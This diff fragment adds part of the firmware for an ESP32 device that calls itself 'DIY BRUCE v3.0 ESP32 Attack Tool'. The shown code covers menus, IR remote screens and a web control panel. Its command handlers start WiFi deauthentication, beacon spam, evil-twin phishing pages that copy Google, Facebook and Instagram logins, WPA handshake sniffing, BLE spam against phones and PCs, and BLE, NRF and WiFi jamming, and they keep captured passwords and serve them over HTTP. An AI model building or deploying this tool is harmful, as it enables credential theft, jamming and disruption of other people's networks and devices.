+    u8g2.clearBuffer(); drawTopBar(); u8g2.drawBox(0,0,128,12); u8g2.setDrawColor(0);
+    u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40,10,"AC Remote"); u8g2.setDrawColor(1); u8g2.drawHLine(0,12,128);
+    for(int i=0;i<acCnt;i++){ int y=24+i*8; if(i==acIdx) u8g2.drawStr(5,y,">"); u8g2.drawStr(15,y,acCmds[i]); }
+    drawFtr("UP/DN=sel OK=send BACK"); u8g2.sendBuffer();
+    if(btn(BTN_UP)) acIdx=(acIdx-1+acCnt)%acCnt;
+    else if(btn(BTN_DOWN)) acIdx=(acIdx+1)%acCnt;
+    else if(btn(BTN_OK)){ IrSender.sendNEC(0x1234,codes[acIdx]&0xFFFF,0); showMsg("IR SENT!"); }
+    else if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void drawIR_Custom() {
+  uint32_t code=0xE0E040BF;
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
+    u8g2.drawStr(5,30,"IR Custom"); char buf[20]; sprintf(buf,"0x%08lX",code); u8g2.drawStr(5,45,buf);
+    drawFtr("LR=change  OK=send  BACK=exit"); u8g2.sendBuffer();
+    if(btn(BTN_LEFT)) code-=0x0001;
+    else if(btn(BTN_RIGHT)) code+=0x0001;
+    else if(btn(BTN_OK)){ IrSender.sendNEC((code>>16)&0xFFFF,code&0xFFFF,0); showMsg("SENT!"); }
+    else if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void recordIR() { showMsg("RECORD IR (placeholder)"); }
+void sendRawIR() { showMsg("SEND RAW (placeholder)"); }
+void stopIRAttack() { showMsg("IR STOPPED"); }
+
+// ==================== НАЛАШТУВАННЯ ====================
+void setBrightness() {
+  while(true){
+    u8g2.clearBuffer(); drawTopBar(); u8g2.drawBox(0,0,128,12); u8g2.setDrawColor(0);
+    u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(40,10,"Brightness"); u8g2.setDrawColor(1); u8g2.drawHLine(0,12,128);
+    u8g2.drawFrame(8,32,112,12); u8g2.drawBox(8,32,contrast*112/255,12);
+    char buf[8]; sprintf(buf,"%d%%",contrast*100/255);
+    u8g2.setFont(u8g2_font_6x10_tr); int w=u8g2.getStrWidth(buf);
+    u8g2.drawStr((128-w)/2,52,buf);
+    u8g2.drawStr(8,30,"<"); u8g2.drawStr(110,30,">");
+    drawFtr("LR=change  OK=save  BACK"); u8g2.sendBuffer();
+    if(btn(BTN_LEFT) && contrast>10) contrast-=10;
+    else if(btn(BTN_RIGHT) && contrast<255) contrast+=10;
+    else if(btn(BTN_OK)){ EEPROM.write(1,contrast); EEPROM.commit(); u8g2.setContrast(contrast); showMsg("SAVED!"); break; }
+    else if(btn(BTN_BACK)) break;
+    delay(50);
+  }
+}
+void startWebServer() {
+  if(!webRunning){
+    WiFi.softAP(AP_SSID, AP_PASSWORD);
+    server.on("/", handleRoot);
+    server.on("/cmd", handleCmd);
+    server.on("/data", handleData);
+    server.begin();
+    dnsServer.start(53, "*", WiFi.softAPIP());
+    webRunning=true;
+    showMsg("WEB: 192.168.4.1");
+  } else showMsg("WEB ALREADY RUNNING");
+}
+void stopWebServer() {
+  if(webRunning){
+    dnsServer.stop();
+    server.stop();
+    WiFi.softAPdisconnect(true);
+    webRunning=false;
+    showMsg("WEB STOPPED");
+  } else showMsg("WEB NOT RUNNING");
+}
+void showPasswordsList() { showMsg(capturedPasswords.length() ? capturedPasswords.substring(0, 50).c_str() : "NO PASSWORDS"); }
+void showHandshakesList() { showMsg(handshakes.length() ? handshakes.substring(0, 50).c_str() : "NO HANDSHAKES"); }
+void showAbout() {
+  u8g2.clearBuffer(); drawTopBar(); u8g2.drawBox(0,0,128,12); u8g2.setDrawColor(0);
+  u8g2.setFont(u8g2_font_6x10_tr); u8g2.drawStr(50,10,"About"); u8g2.setDrawColor(1); u8g2.drawHLine(0,12,128);
+  u8g2.drawStr(10,30,"DIY BRUCE v3.0"); u8g2.drawStr(10,45,"ESP32 Attack Tool"); u8g2.drawStr(10,58,"WiFi | BLE | NRF | IR | EVIL");
+  drawFtr("BACK=exit"); u8g2.sendBuffer(); while(!btn(BTN_BACK)) delay(50);
+}
+void rebootDevice() { ESP.restart(); }
+
+// ==================== ВЕБ-ОБРОБНИКИ ====================
+void handleRoot() { server.send(200, "text/html", adminPage); }
+void handleData() { String json = "{\"deauth\":" + String(deauthPackets) + ",\"beacon\":" + String(beaconPackets) + ",\"rssi\":" + String(lastRSSI) + ",\"batt\":67}"; server.send(200, "application/json", json); }
+void handleCmd() {
+  if (!server.hasArg("c")) { server.send(200, "text/plain", "NO CMD"); return; }
+  String cmd = server.arg("c");
+  if (cmd == "scan") { scanWiFi(); server.send(200, "text/plain", "SCAN OK\n"); }
+  else if (cmd == "deauth_start") { startWiFiDeauth(); server.send(200, "text/plain", "DEAUTH START\n"); }
+  else if (cmd == "deauth_stop") { deauthActive = false; server.send(200, "text/plain", "DEAUTH STOP\n"); }
+  else if (cmd == "beacon_start") { startWiFiBeacon(); server.send(200, "text/plain", "BEACON START\n"); }
+  else if (cmd == "beacon_stop") { beaconActive = false; server.send(200, "text/plain", "BEACON STOP\n"); }
+  else if (cmd == "evil_google") { startEvilTwin(fakePageGoogle); server.send(200, "text/plain", "EVIL GOOGLE\n"); }
+  else if (cmd == "evil_fb") { startEvilTwin(fakePageFacebook); server.send(200, "text/plain", "EVIL FB\n"); }
+  else if (cmd == "evil_insta") { startEvilTwin(fakePageInstagram); server.send(200, "text/plain", "EVIL INSTAGRAM\n"); }
+  else if (cmd == "evil_generic") { startEvilTwin(fakePageGeneric); server.send(200, "text/plain", "EVIL GENERIC\n"); }
+  else if (cmd == "evil_stop") { stopEvilTwin(); server.send(200, "text/plain", "EVIL STOP\n"); }
+  else if (cmd == "handshake") { startHandshakeSniffer(); server.send(200, "text/plain", "HANDSHAKE\n"); }
+  else if (cmd == "ble_scan") { scanBLE(); server.send(200, "text/plain", "BLE SCAN\n"); }
+  else if (cmd == "ble_apple") { startBLEAppleJuice(); server.send(200, "text/plain", "BLE APPLE\n"); }
+  else if (cmd == "ble_samsung") { startBLESamsung(); server.send(200, "text/plain", "BLE SAMSUNG\n"); }
+  else if (cmd == "ble_android") { startBLEAndroid(); server.send(200, "text/plain", "BLE ANDROID\n"); }
+  else if (cmd == "ble_windows") { startBLEWindows(); server.send(200, "text/plain", "BLE WINDOWS\n"); }
+  else if (cmd == "ble_all") { startBLESpamAll(); server.send(200, "text/plain", "BLE ALL\n"); }
+  else if (cmd == "ble_jam") { startBLEJammer(); server.send(200, "text/plain", "BLE JAM\n"); }
+  else if (cmd == "nrf_jam") { startNRFJammer(); server.send(200, "text/plain", "NRF JAM\n"); }
+  else if (cmd == "nrf_stop") { stopNRFAttack(); server.send(200, "text/plain", "NRF STOP\n"); }
+  else if (cmd == "view_pass") { server.send(200, "text/plain", capturedPasswords.length() ? capturedPasswords : "NO PASSWORDS\n"); }
+  else if (cmd == "view_hand") { server.send(200, "text/plain", handshakes.length() ? handshakes : "NO HANDSHAKES\n"); }
+  else if (cmd == "clear_pass") { capturedPasswords = ""; handshakes = ""; savePasswordsToEEPROM(); server.send(200, "text/plain", "CLEARED\n"); }
+  else if (cmd == "reset") { server.send(200, "text/plain", "RESET\n"); delay(100); ESP.restart(); }
+  else { server.send(200, "text/plain", "UNKNOWN\n"); }
+}
+
+// ==================== НАВІГАЦІЯ ====================
+void goBack() { curState = S_MENU; drawMainMenu(); }
+void enterAction() {
+  switch (moduleIdx) {
+    case 0:
+      switch(subIdx){
+        case 0: scanWiFi(); goBack(); break;
+        case 1: startWiFiDeauth(); goBack(); break;
+        case 2: startWiFiBeacon(); goBack(); break;
+        case 3: startEvilTwin(fakePageGeneric); goBack(); break;
+        case 4: startHandshakeSniffer(); goBack(); break;
+        case 5: startWiFiJammer(); goBack(); break;
+        case 6: startWiFiMonitor(); goBack(); break;
+        case 7: startWiFiInfo(); goBack(); break;
+        case 8: saveWiFiPasswords(); goBack(); break;
+        case 9: showWiFiPasswords(); goBack(); break;
+        case 10: clearWiFiPasswords(); goBack(); break;
+        case 11: setWiFiChannel(); goBack(); break;
+        case 12: stopWiFiAttack(); goBack(); break;
+        case 13: rebootDevice(); break;
+      } break;
+    case 1:
+      switch(subIdx){
+        case 0: scanBLE(); goBack(); break;
+        case 1: startBLEAppleJuice(); goBack(); break;
+        case 2: startBLESamsung(); goBack(); break;
+        case 3: startBLEAndroid(); goBack(); break;
+        case 4: startBLEWindows(); goBack(); break;
+        case 5: startBLESpamAll(); goBack(); break;
+        case 6: startBLEJammer(); goBack(); break;
+        case 7: startBLEInfo(); goBack(); break;
+        case 8: stopBLEAttack(); goBack(); break;
+        case 9: rebootDevice(); break;
+      } break;
+    case 2:
+      switch(subIdx){
+        case 0: scanNRF(); goBack(); break;
+        case 1: startNRFJammer(); goBack(); break;
+        case 2: startNRFSend(); goBack(); break;
+        case 3: startNRFInfo(); goBack(); break;
+        case 4: setNRFChannel(); goBack(); break;
+        case 5: stopNRFAttack(); goBack(); break;
+        case 6: rebootDevice(); break;
+      } break;
+    case 3:
+      switch(subIdx){
+        case 0: drawIR_TV(); goBack(); break;
+        case 1: drawIR_AC(); goBack(); break;
+        case 2: drawIR_Custom(); goBack(); break;
+        case 3: recordIR(); goBack(); break;
+        case 4: sendRawIR(); goBack(); break;
+        case 5: stopIRAttack(); goBack(); break;
+        case 6: rebootDevice(); break;
+      } break;
+    case 4:
+      switch(subIdx){
+        case 0: setNRFChannel(); goBack(); break;
+        case 1: setBrightness(); goBack(); break;
+        case 2: startWebServer(); goBack(); break;
+        case 3: stopWebServer(); goBack(); break;
+        case 4: showPasswordsList(); goBack(); break;
+        case 5: showHandshakesList(); goBack(); break;
+        case 6: formatStorage(); goBack(); break;
+        case 7: showAbout(); goBack(); break;
+        case 8: rebootDevice(); break;
+      } break;
+  }
+}
+void loopMain() {
+  if (btn(BTN_LEFT)) { moduleIdx = (moduleIdx - 1 + MODULE_COUNT) % MODULE_COUNT; drawMainMenu(); }
+  else if (btn(BTN_RIGHT)) { moduleIdx = (moduleIdx + 1) % MODULE_COUNT; drawMainMenu(); }
+  else if (btn(BTN_OK) || btn(BTN_DOWN)) { curState = S_SUBMENU; subIdx = 0; const char** items = moduleIdx==0?wifiSub:(moduleIdx==1?bleSub:(moduleIdx==2?nrfSub:(moduleIdx==3?irSub:settSub))); int size = moduleIdx==0?WIFI_SIZE:(moduleIdx==1?BLE_SIZE:(moduleIdx==2?NRF_SIZE:(moduleIdx==3?IR_SIZE:SETT_SIZE))); drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
+}
+void loopSub() {
+  int size = moduleIdx==0?WIFI_SIZE:(moduleIdx==1?BLE_SIZE:(moduleIdx==2?NRF_SIZE:(moduleIdx==3?IR_SIZE:SETT_SIZE)));
+  const char** items = moduleIdx==0?wifiSub:(moduleIdx==1?bleSub:(moduleIdx==2?nrfSub:(moduleIdx==3?irSub:settSub)));
+  if (btn(BTN_UP)) { subIdx = (subIdx - 1 + size) % size; drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
+  else if (btn(BTN_DOWN)) { subIdx = (subIdx + 1) % size; drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
+  else if (btn(BTN_OK)) { enterAction(); }
+  else if (btn(BTN_BACK)) { curState = S_MENU; drawMainMenu(); }
+}
+
+// ==================== SETUP & LOOP ====================
+void setup() {
+  pinMode(BTN_UP, INPUT_PULLUP); pinMode(BTN_DOWN, INPUT_PULLUP); pinMode(BTN_OK, INPUT_PULLUP);
+  pinMode(BTN_LEFT, INPUT_PULLUP); pinMode(BTN_RIGHT, INPUT_PULLUP); pinMode(BTN_BACK, INPUT_PULLUP);
+  EEPROM.begin(32); nrfCh = EEPROM.read(0); if (nrfCh > 125) nrfCh = 76;
+  contrast = EEPROM.read(1); if (contrast < 10) contrast = 200;
+  u8g2.begin(); u8g2.setContrast(contrast);
+  IrSender.begin(IR_PIN);
+  SPI.begin(18, 19, 23, NRF_CSN); radio.begin();
+  if (radio.isChipConnected()) { radio.setChannel(nrfCh); radio.setPALevel(RF24_PA_LOW); radio.setDataRate(RF24_1MBPS); radio.setAutoAck(false); nrfOK = true; }
+  loadPasswordsFromEEPROM();
+  for (int x = 128; x >= 0; x -= 8) { u8g2.clearBuffer(); u8g2.setFont(u8g2_font_logisoso24_tr); u8g2.drawStr(x + 4, 32, "DIY"); u8g2.setFont(u8g2_font_7x13B_tr); u8g2.drawStr(x + 4, 48, "BRUCE"); u8g2.sendBuffer(); delay(10); }
+  delay(500);
+  curState = S_MENU; drawMainMenu();
+  esp_wifi_set_promiscuous(true); esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+  esp_wifi_set_promiscuous_rx_cb(&handshakeSniffer);
+}
+void loop() {
+  if (webRunning) { dnsServer.processNextRequest(); server.handleClient(); }
+  if (WiFi.softAPgetStationNum() > 0) lastRSSI = WiFi.RSSI();
+  switch (curState) {
+    case S_MENU: loopMain(); break;
+    case S_SUBMENU: loopSub(); break;
+    default: break;
+  }
+  delay(20);
+}
